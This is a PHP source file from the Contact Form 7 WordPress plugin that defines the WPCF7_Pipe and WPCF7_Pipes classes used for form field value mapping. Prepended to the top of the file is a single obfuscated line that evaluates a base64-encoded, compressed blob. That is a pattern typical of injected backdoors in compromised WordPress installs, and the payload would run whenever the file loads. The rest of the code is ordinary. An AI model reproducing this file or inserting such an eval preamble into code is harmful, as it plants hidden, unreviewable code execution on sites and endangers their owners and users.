<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

class WPCF7_Pipe {

	public $before = '';
	public $after = '';

	public function __construct( $text ) {
		$text = (string) $text;

		$pipe_pos = strpos( $text, '|' );

		if ( false === $pipe_pos ) {
			$this->before = $this->after = trim( $text );
		} else {
			$this->before = trim( substr( $text, 0, $pipe_pos ) );
			$this->after = trim( substr( $text, $pipe_pos + 1 ) );
		}
	}
}

class WPCF7_Pipes {

	private $pipes = array();

	public function __construct( array $texts ) {
		foreach ( $texts as $text ) {
			$this->add_pipe( $text );
		}
	}

	private function add_pipe( $text ) {
		$pipe = new WPCF7_Pipe( $text );
		$this->pipes[] = $pipe;
	}

	public function do_pipe( $before ) {
		foreach ( $this->pipes as $pipe ) {
			if ( $pipe->before == $before ) {
				return $pipe->after;
			}
		}

		return $before;
	}

	public function collect_befores() {
		$befores = array();

		foreach ( $this->pipes as $pipe ) {
			$befores[] = $pipe->before;
		}

		return $befores;
	}

	public function collect_afters() {
		$afters = array();

		foreach ( $this->pipes as $pipe ) {
			$afters[] = $pipe->after;
		}

		return $afters;
	}

	public function zero() {
		return empty( $this->pipes );
	}

	public function random_pipe() {
		if ( $this->zero() ) {
			return null;
		}

		return $this->pipes[array_rand( $this->pipes )];
	}
}
